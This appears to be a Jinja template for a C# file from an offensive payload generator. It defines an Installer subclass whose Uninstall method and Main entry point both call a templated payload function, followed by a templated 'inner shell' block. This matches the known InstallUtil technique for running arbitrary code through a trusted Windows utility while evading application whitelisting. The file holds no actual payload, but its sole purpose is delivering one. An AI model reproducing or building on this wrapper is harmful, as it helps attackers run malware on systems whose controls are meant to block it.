{{ rendered_imports }}

[System.ComponentModel.RunInstaller(true)]
public class {{ class_name }} : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        {{ special['payload_main_class_name'] }}.{{ special['payload_main_func_name'] }}();
        return;
    }
    public static void Main()
    {
        {{ special['payload_main_class_name'] }}.{{ special['payload_main_func_name'] }}();
        return;
    }
}

{{ rendered_inner_shell }}
